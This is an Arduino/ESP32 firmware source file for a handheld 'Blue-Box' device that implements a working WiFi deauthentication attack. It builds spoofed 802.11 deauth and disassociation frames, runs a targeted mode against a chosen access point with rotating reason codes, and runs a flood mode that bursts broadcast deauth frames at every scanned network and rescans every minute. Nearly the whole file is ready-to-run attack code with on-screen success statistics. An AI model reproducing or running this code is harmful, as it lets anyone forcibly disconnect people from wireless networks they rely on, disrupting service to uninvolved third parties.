// ============================================================
// wifi_deauth.ino — WiFi Deauther for Blue-Box
// Ported from Bruce firmware's deauther.cpp + wifi_atks.cpp
// Display rewritten for U8G2 128x64 monochrome OLED
// WITH REAL SUCCESS/FAIL PACKET TRACKING
// ============================================================

// ===== Shared WiFi types and globals are now declared in HIZMOS_OLED_U8G2lib.ino =====

// ===== Default deauth frame template (from Bruce/Marauder) =====
const uint8_t deauth_frame_default[] = {
  0xc0, 0x00, 0x3a, 0x01,               // Type: Deauth, flags
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   // Destination (broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Source (placeholder)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // BSSID (placeholder)
  0xf0, 0xff,                            // Sequence
  0x02, 0x00                             // Reason code
};

// ===== Build optimized deauth/disassoc frame (from Bruce) =====
void buildDeauthFrame(uint8_t* frame,
                      const uint8_t* dest,
                      const uint8_t* src,
                      const uint8_t* bssid,
                      uint8_t reason,
                      bool is_disassoc) {
  // Frame control
  frame[0] = is_disassoc ? 0xA0 : 0xC0;  // Disassoc or Deauth
  frame[1] = 0x00;
  
  // Duration
  frame[2] = 0x00;
  frame[3] = 0x00;
  
  // MAC addresses
  memcpy(&frame[4], dest, 6);    // Destination
  memcpy(&frame[10], src, 6);    // Source
  memcpy(&frame[16], bssid, 6);  // BSSID
  
  // Randomized sequence control
  uint16_t seq = random(0, 4096);
  frame[22] = (seq >> 4) & 0xFF;
  frame[23] = ((seq & 0x0F) << 4);
  
  // Reason code
  frame[24] = reason;
  frame[25] = 0x00;
}

// ===== Deauth Statistics =====
struct DeauthStats {
  unsigned long totalSent;
  unsigned long totalOK;
  unsigned long totalFail;
  unsigned long fpsCounter;
  unsigned long fps;
  unsigned long lastFpsTime;
};

// ===== TARGETED DEAUTH (selected AP) =====
void deauthTarget(int netIndex) {
  if (netIndex < 0 || netIndex >= wifi_netCount) return;
  
  WiFiNetwork &target = scannedNets[netIndex];
  uint8_t channel = target.channel;
  
  Serial.printf("[DEAUTH] Target: %s CH:%d\n", target.ssid, channel);
  
  // Try monitor mode first (enhanced deauth)
  bool enhanced = wifiEnterMonitorMode(channel);
  wifi_interface_t iface = WIFI_IF_STA;
  
  if (!enhanced) {
    // Fallback to AP mode
    Serial.println("[DEAUTH] Monitor mode failed, using AP mode");
    WiFi.disconnect(true);
    delay(10);
    WiFi.mode(WIFI_AP);
    WiFi.softAP("BlueBoxAtk", "", channel, 1, 4, false);
    delay(100);
    iface = WIFI_IF_AP;
  }
  
  // Build 4 frame variants (Bruce's proven approach)
  uint8_t deauth_ap2sta[26];    // AP → Station deauth
  uint8_t disassoc_ap2sta[26];  // AP → Station disassociation
  uint8_t deauth_sta2ap[26];    // Station → AP deauth (spoofed)
  uint8_t disassoc_sta2ap[26];  // Station → AP disassociation (spoofed)
  
  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  
  buildDeauthFrame(deauth_ap2sta,   broadcast,     target.bssid, target.bssid, 0x07, false);
  buildDeauthFrame(disassoc_ap2sta, broadcast,     target.bssid, target.bssid, 0x07, true);
  buildDeauthFrame(deauth_sta2ap,   target.bssid,  broadcast,    target.bssid, 0x07, false);
  buildDeauthFrame(disassoc_sta2ap, target.bssid,  broadcast,    target.bssid, 0x07, true);
  
  // Reason codes to rotate through (from Bruce)
  uint8_t reasons[] = {0x01, 0x04, 0x06, 0x07, 0x08};
  uint8_t reasonIdx = 0;
  
  // Stats tracking
  DeauthStats stats = {0, 0, 0, 0, 0, millis()};
  
  // Draw initial screen
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_5x7_tf);
  u8g2.drawStr(0, 7, "DEAUTH ACTIVE");
  u8g2.drawHLine(0, 9, 128);
  u8g2.sendBuffer();
  
  unsigned long lastDisplayUpdate = 0;
  
  while (digitalRead(BTN_BACK) == HIGH) {
    // Rotate reason codes every 20 frames
    if (stats.totalSent % 20 == 0 && stats.totalSent > 0) {
      reasonIdx = (reasonIdx + 1) % 5;
      deauth_ap2sta[24] = reasons[reasonIdx];
      disassoc_ap2sta[24] = reasons[reasonIdx];
      deauth_sta2ap[24] = reasons[reasonIdx];
      disassoc_sta2ap[24] = reasons[reasonIdx];
    }
    
    // Send 4 frame variants
    bool r1 = wifiSendSingleFrame(deauth_ap2sta,   26, iface);
    bool r2 = wifiSendSingleFrame(disassoc_ap2sta, 26, iface);
    bool r3 = wifiSendSingleFrame(deauth_sta2ap,   26, iface);
    bool r4 = wifiSendSingleFrame(disassoc_sta2ap, 26, iface);
    
    stats.totalSent += 4;
    stats.fpsCounter += 4;
    if (r1) stats.totalOK++; else stats.totalFail++;
    if (r2) stats.totalOK++; else stats.totalFail++;
    if (r3) stats.totalOK++; else stats.totalFail++;
    if (r4) stats.totalOK++; else stats.totalFail++;
    
    // Burst timing (Bruce's pattern)
    if (stats.totalSent % 16 == 0) {
      delay(30);  // Pause between bursts
    } else {
      delay(2);   // Fast burst
    }
    
    // Update display every 500ms
    if (millis() - lastDisplayUpdate > 500) {
      // Calculate FPS
      unsigned long elapsed = millis() - stats.lastFpsTime;
      if (elapsed >= 1000) {
        stats.fps = stats.fpsCounter;
        stats.fpsCounter = 0;
        stats.lastFpsTime = millis();
      }
      
      // Calculate success rate
      float successRate = 0;
      if (stats.totalSent > 0) {
        successRate = (float)stats.totalOK / (float)stats.totalSent * 100.0f;
      }
      
      u8g2.clearBuffer();
      u8g2.setFont(u8g2_font_5x7_tf);
      
      // Title + SSID
      char line[28];
      snprintf(line, 28, "DEAUTH: %.16s", target.ssid);
      u8g2.drawStr(0, 7, line);
      u8g2.drawHLine(0, 9, 128);
      
      // Channel + Mode
      snprintf(line, 28, "CH:%d  %s", channel, enhanced ? "Monitor" : "AP");
      u8g2.drawStr(0, 19, line);
      
      // Sent + OK
      snprintf(line, 28, "Sent:%-6lu OK:%-6lu", stats.totalSent, stats.totalOK);
      u8g2.drawStr(0, 28, line);
      
      // Fail + FPS
      snprintf(line, 28, "Fail:%-5lu  %lu/s", stats.totalFail, stats.fps);
      u8g2.drawStr(0, 37, line);
      
      // Success rate bar
      int barW = (int)(successRate * 1.12f);  // 112px max
      u8g2.drawFrame(0, 41, 114, 10);
      if (barW > 0) u8g2.drawBox(1, 42, min(barW, 112), 8);
      snprintf(line, 28, "%.1f%%", successRate);
      u8g2.drawStr(116, 50, line);
      
      // Reason code indicator
      snprintf(line, 28, "Reason:0x%02X", reasons[reasonIdx]);
      u8g2.drawStr(0, 60, line);
      
      // Back hint
      u8g2.drawStr(76, 60, "[BACK]stop");
      
      u8g2.sendBuffer();
      lastDisplayUpdate = millis();
      
      // === DEAUTH RUNTIME DIAGNOSTICS ===
      Serial.printf("[DEAUTH-DIAG] Heap:%lu MaxBlk:%lu Sent:%lu OK:%lu Fail:%lu Rate:%.1f%% FPS:%lu\n",
        (unsigned long)esp_get_free_heap_size(),
        (unsigned long)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT),
        stats.totalSent, stats.totalOK, stats.totalFail, successRate, stats.fps);
    }
  }
  
  // Cleanup
  Serial.printf("[DEAUTH] Stopped. Sent:%lu OK:%lu Fail:%lu\n",
                stats.totalSent, stats.totalOK, stats.totalFail);
  
  if (enhanced) {
    wifiExitMonitorMode();
  } else {
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
  }
  
  // Summary screen
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_7x14_tf);
  u8g2.drawStr(10, 15, "Attack Stopped");
  u8g2.setFont(u8g2_font_5x7_tf);
  
  char buf[32];
  snprintf(buf, 32, "Total: %lu frames", stats.totalSent);
  u8g2.drawStr(5, 30, buf);
  snprintf(buf, 32, "OK: %lu  Fail: %lu", stats.totalOK, stats.totalFail);
  u8g2.drawStr(5, 40, buf);
  float rate = stats.totalSent > 0 ? (float)stats.totalOK / stats.totalSent * 100 : 0;
  snprintf(buf, 32, "Success: %.1f%%", rate);
  u8g2.drawStr(5, 50, buf);
  u8g2.drawStr(5, 63, "[BACK] return");
  u8g2.sendBuffer();
  
  // Wait for button to return
  delay(200);
  while (digitalRead(BTN_BACK) == HIGH && digitalRead(BTN_SELECT) == HIGH) {
    delay(10);
  }
  delay(200);
}

// ===== DEAUTH FLOOD (all scanned APs) =====
void deauthFlood() {
  if (wifi_netCount <= 0) {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_7x14_tf);
    u8g2.drawStr(10, 30, "No targets!");
    u8g2.drawStr(10, 50, "Scan first.");
    u8g2.sendBuffer();
    delay(1500);
    return;
  }
  
  // Setup AP+STA mode for attack
  if (!wifiSetupAttackMode()) {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_7x14_tf);
    u8g2.drawStr(10, 30, "WiFi setup");
    u8g2.drawStr(10, 50, "FAILED!");
    u8g2.sendBuffer();
    delay(1500);
    return;
  }
  
  // Prepare deauth frame
  uint8_t deauth_frame[26];
  memcpy(deauth_frame, deauth_frame_default, 26);
  
  DeauthStats stats = {0, 0, 0, 0, 0, millis()};
  unsigned long lastDisplayUpdate = 0;
  unsigned long headlessStart = millis();
  unsigned long rescanTimer = millis();
  uint8_t currentChannel = 0;
  
  while (digitalRead(BTN_BACK) == HIGH) {
#ifdef HEADLESS_TEST_MODE
    if (millis() - headlessStart > 15000) {
      Serial.println("[HEADLESS-TEST] Deauth Flood completed 15s");
      break;
    }
#endif
    // Cycle through all scanned networks
    for (int n = 0; n < wifi_netCount; n++) {
      if (digitalRead(BTN_BACK) == LOW) break;
      
      WiFiNetwork &net = scannedNets[n];
      currentChannel = net.channel;
      
      // Set channel and prepare frame
      esp_wifi_set_channel(net.channel, WIFI_SECOND_CHAN_NONE);
      delay(5);
      
      // Copy BSSID into deauth frame
      memcpy(&deauth_frame[4], "\xFF\xFF\xFF\xFF\xFF\xFF", 6);  // Broadcast dest
      memcpy(&deauth_frame[10], net.bssid, 6);                   // Source = AP
      memcpy(&deauth_frame[16], net.bssid, 6);                   // BSSID = AP
      
      // Burst 50 frames per AP
      for (int i = 0; i < 50; i++) {
        if (digitalRead(BTN_BACK) == LOW) break;
        
        bool ok = wifiSendRawFrame(deauth_frame, 26); // 3 copies inside
        stats.totalSent += 3;
        if (ok) stats.totalOK += 3; else stats.totalFail += 3;
        stats.fpsCounter += 3;
        
        // Cooperative yielding to prevent task starvation during burst
        if (i % 8 == 0) {
          delay(10);
        } else {
          delay(1);
        }
      }
    }
    
    // Update display every 500ms
    if (millis() - lastDisplayUpdate > 500) {
      unsigned long elapsed = millis() - stats.lastFpsTime;
      if (elapsed >= 1000) {
        stats.fps = stats.fpsCounter;
        stats.fpsCounter = 0;
        stats.lastFpsTime = millis();
      }
      
      u8g2.clearBuffer();
      u8g2.setFont(u8g2_font_5x7_tf);
      u8g2.drawStr(0, 7, "DEAUTH FLOOD");
      u8g2.drawHLine(0, 9, 128);
      
      char line[28];
      snprintf(line, 28, "Targets: %d  CH:%d", wifi_netCount, currentChannel);
      u8g2.drawStr(0, 19, line);
      
      snprintf(line, 28, "Sent:%-6lu OK:%-6lu", stats.totalSent, stats.totalOK);
      u8g2.drawStr(0, 28, line);
      
      snprintf(line, 28, "Fail:%-5lu  %lu/s", stats.totalFail, stats.fps);
      u8g2.drawStr(0, 37, line);
      
      // Progress bar
      float rate = stats.totalSent > 0 ? (float)stats.totalOK / stats.totalSent * 100 : 0;
      int barW = (int)(rate * 1.12f);
      u8g2.drawFrame(0, 41, 114, 10);
      if (barW > 0) u8g2.drawBox(1, 42, min(barW, 112), 8);
      snprintf(line, 28, "%.1f%%", rate);
      u8g2.drawStr(116, 50, line);
      
      u8g2.drawStr(0, 60, "[BACK] stop");
      u8g2.sendBuffer();
      lastDisplayUpdate = millis();
      
      // === FLOOD RUNTIME DIAGNOSTICS ===
      Serial.printf("[FLOOD-DIAG] Heap:%lu MaxBlk:%lu Sent:%lu OK:%lu Fail:%lu Rate:%.1f%% FPS:%lu\n",
        (unsigned long)esp_get_free_heap_size(),
        (unsigned long)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT),
        stats.totalSent, stats.totalOK, stats.totalFail, rate, stats.fps);
    }
    
    // Re-scan every 60 seconds for reliability (Bruce's approach)
    if (millis() - rescanTimer > 60000) {
      wifiDoScan();
      wifiSetupAttackMode();
      rescanTimer = millis();
    }
  }
  
  // Cleanup
  wifiCleanup();
  
  // Summary
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_7x14_tf);
  u8g2.drawStr(10, 15, "Flood Stopped");
  u8g2.setFont(u8g2_font_5x7_tf);
  char buf[32];
  snprintf(buf, 32, "Total: %lu frames", stats.totalSent);
  u8g2.drawStr(5, 30, buf);
  snprintf(buf, 32, "OK: %lu  Fail: %lu", stats.totalOK, stats.totalFail);
  u8g2.drawStr(5, 40, buf);
  u8g2.drawStr(5, 63, "[BACK] return");
  u8g2.sendBuffer();
  
  delay(200);
  while (digitalRead(BTN_BACK) == HIGH && digitalRead(BTN_SELECT) == HIGH) {
    delay(10);
  }
  delay(200);
}
